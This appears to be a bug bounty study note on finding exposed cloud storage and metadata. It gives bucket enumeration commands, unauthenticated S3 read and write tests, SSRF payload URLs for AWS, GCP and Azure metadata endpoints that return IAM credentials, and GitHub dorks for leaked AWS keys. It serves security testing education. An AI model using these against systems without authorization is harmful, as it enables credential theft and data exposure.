# 📌 Cloud Misconfigurations

> Publicly exposed cloud storage, services, and APIs due to insecure defaults or dev negligence — one of the richest passive recon goldmines.

---

## 🔍 Definition

**Cloud Misconfigurations** are security errors in cloud deployments — open S3 buckets, world-readable Azure blobs, publicly exposed GCP storage, unsecured cloud metadata endpoints, and misconfigured IAM policies that let anyone access data they shouldn't.

---

## 🧠 Core Concepts

- **Open bucket** — cloud storage container with public read or write access
- **SSRF → metadata** — if you get SSRF, hitting `169.254.169.254` dumps cloud credentials
- **IAM misconfiguration** — overly permissive roles that allow privilege escalation
- **Exposed environment variables** — `.env` files in public repos or open storage
- **Subdomain → S3** — CNAME pointing to S3 = potential subdomain takeover + storage access

---

## ⚙️ How to Find Cloud Misconfigs

### 1. Storage Bucket Enumeration

```bash
# CloudEnum — checks AWS S3, Azure Blob, GCP Storage
python3 cloud_enum.py -k targetcorp
python3 cloud_enum.py -k target-corp
python3 cloud_enum.py -k target_assets

# S3Scanner — checks if found buckets are open
s3scanner scan --bucket target-assets
s3scanner scan --bucket-file buckets.txt
```

### 2. Manual S3 Testing

```bash
# Check if bucket is public
curl -s https://target-assets.s3.amazonaws.com/
aws s3 ls s3://target-assets --no-sign-request
aws s3 cp s3://target-assets/sensitive.txt . --no-sign-request

# Check for write access
aws s3 cp test.txt s3://target-assets/test.txt --no-sign-request
```

### 3. Cloud Metadata via SSRF

```bash
# AWS metadata endpoint
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 4. GitHub Leak Recon for Cloud Creds

```bash
# GitHub dorks
org:TargetCorp "AWS_ACCESS_KEY_ID"
org:TargetCorp "AWS_SECRET_ACCESS_KEY"
org:TargetCorp filename:.env "s3"
org:TargetCorp "bucket_name"

# trufflehog
trufflehog git https://github.com/target/repo --only-verified
```

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| **S3 bucket** | AWS object storage container |
| **Blob storage** | Azure's equivalent of S3 |
| **GCS bucket** | Google Cloud Storage equivalent |
| **IMDS** | Instance Metadata Service — `169.254.169.254` — leaks IAM creds via SSRF |
| **IAM** | Identity and Access Management — controls permissions in cloud |
| **ACL** | Access Control List — defines who can read/write a resource |
| **Public-read** | Bucket policy allowing anyone on the internet to read files |
| **Public-write** | Bucket policy allowing anyone to upload files — critical severity |

---

## 🔥 Important Details & Gotchas

- **Bucket names are guessable** — target companies typically use: `companyname-assets`, `companyname-backup`, `companyname-dev`, `companyname-prod`, `companyname-static`
- **AWS S3 error codes matter:**
  - `NoSuchBucket` → bucket doesn't exist, register it for takeover
  - `AccessDenied` → bucket exists but private
  - `200 OK with XML` → bucket is public and listable
- **SSRF to IMDS = automatic critical** — if you can hit `169.254.169.254` you get IAM role credentials → full AWS account compromise potentially
- **Write access = critical** — if you can upload to a public bucket, you can serve malware, poison CDN content, or upload web shells if bucket is used as a web host
- **GCP metadata needs custom header** — `Metadata-Flavor: Google` required, blocks naive SSRF attempts
- **Azure IMDS** — similar endpoint, different path, also needs specific headers in newer versions

---

## 🌍 Bucket Naming Convention Guessing

```bash
# Generate permutations
for word in assets static backup dev prod staging media files cdn; do
  echo "targetcorp-$word"
  echo "$word-targetcorp"
  echo "targetcorp.$word"
done > buckets.txt

s3scanner scan --bucket-file buckets.txt
```

---

## 🔗 Related Topics

- [[Footprinting Tools — Complete Reference]]
- [[OSINT Methodology]]
- [[Bug Bounty Recon Pipeline]]
- [[Subdomain Takeover]]

---

## 📚 Sources / Further Reading

- CloudEnum GitHub — multi-cloud bucket enumeration
- HackerOne Hacktivity — search "S3 bucket" for real disclosed bugs
- AWS S3 bucket policy docs — understanding ACLs
- SSRF to Cloud Metadata — PortSwigger Web Security Academy
